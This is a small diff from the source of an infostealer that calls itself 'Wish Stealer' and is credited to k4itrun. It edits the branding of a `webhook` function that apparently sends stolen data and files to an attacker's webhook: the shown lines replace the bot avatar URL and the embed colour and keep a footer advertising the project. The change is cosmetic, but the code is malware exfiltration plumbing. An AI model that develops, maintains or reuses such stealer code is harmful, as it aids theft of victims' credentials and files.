@@ -33,11 +33,11 @@ const webhook = async (webhookUrl, data, files = [], canary) => {
     }
 
     data.username = 'Wish Stealer';
-    data.avatar_url = 'https://raw.githubusercontent.com/k4itrun/wish/refs/heads/main/.github/assets/wish-webhook.png';
+    data.avatar_url = 'https://avatars.githubusercontent.com/u/181030699';
 
     if (data.embeds) {
         for (const embed of data.embeds) {
-            embed.color = parseInt('ffffff', 16);
+            embed.color = parseInt('ab3cf5', 16);
             embed.footer = {
                 text: 'github.com/k4itrun/Wish - made by k4itrun',
                 icon_url: 'https://avatars.githubusercontent.com/u/103044629'
